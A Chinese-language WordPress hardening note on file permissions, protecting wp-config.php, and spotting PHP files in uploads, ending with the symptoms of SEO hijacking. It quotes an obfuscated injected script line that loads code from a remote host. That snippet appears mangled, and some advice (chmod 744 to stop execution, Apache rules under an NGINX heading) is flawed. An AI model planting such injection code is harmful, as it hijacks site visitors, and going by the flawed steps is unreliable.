wordpress安全

permalin: wordpress-security tags:

  • wordpress

服务器、用户、文件与目录

文件

上级目录 如 /home/wwwroot 属于 root

chown www:www /home/wwwroot

修改整个 WP 目录为 web 服务器的用户 （nginx 、apache）

例如 www:www

$ chown -R [webuser]:[mygroup] *
$ chmod -R g+w *

chown www-data:www-data -R *

修改目录、文件权限

r w x 4 2 1

目录

允许 www 用户 读、写、执行（进入下级目录） 非 www 用户 只能读、执行，不能修改目录内容

文件

www 用户只能读、写，不能执行命令 非 www 用户只能读

find . -type d -exec chmod 755 {} \;
find . -type f -exec chmod 644 {} \;

修改 wp-config.php 只有 root 可以修改

$ chown root:root wp-config.php
$ chmod 644 wp-config.php

查找 uploads 目录下有哪些 php 文件

（一般情况下这里只允许出现静态文件，如图片等）， 不过对于伪装成 jpeg 的木马，无能为力

find ./wp-content/uploads -name "*.php" -print

禁止 uploads 下文件执行

黑客可以上传可执行的木马文件到 uploads 目录，通过某种方法执行木马文件，获取服务器的管理员权限。

禁止上传的文件能被执行

chmod 744 -R wp-content/uploads/

NGINX 限制一些目录

nginx的location禁止任何用户访问wp-include的文件

可以用 iThemes 生成 config 的文件来让 NGINX 加载

# Block the include-only files.
RewriteEngine On
RewriteBase /
RewriteRule ^wp-config\.php - [F,L]
RewriteRule ^wp-admin/includes/ - [F,L]
RewriteRule !^wp-includes/ - [S=3]
RewriteRule ^wp-includes/[^/]+\.php$ - [F,L]
RewriteRule ^wp-includes/js/tinymce/langs/.+\.php - [F,L]
RewriteRule ^wp-includes/theme-compat/ - [F,L]

症状

一般你会在搜索结果搜索相关关键词，或者自己的网址，看到的标题可能不是自己的网站标题，点击进去可能会跳转到其他地方，或者进去后发现网站已物是人非。

这种情况很明显挂马脚本对user-agent进行了判断，如果user-agent是百度蜘蛛，那么将返回广告。 一般会在网站程序插入JS，或者在php或者其他程序中插入代码，如果是js，一般只要远程调用一个就可以实现劫持，插入代码量很少。

具体代码如下：

document.write("<163"+"cript src='http://141"+"d.172"+"om"+"1263"+".n"+"et/i"+"p.asp?l"+"oc=chengdu'></s"+"cript>");
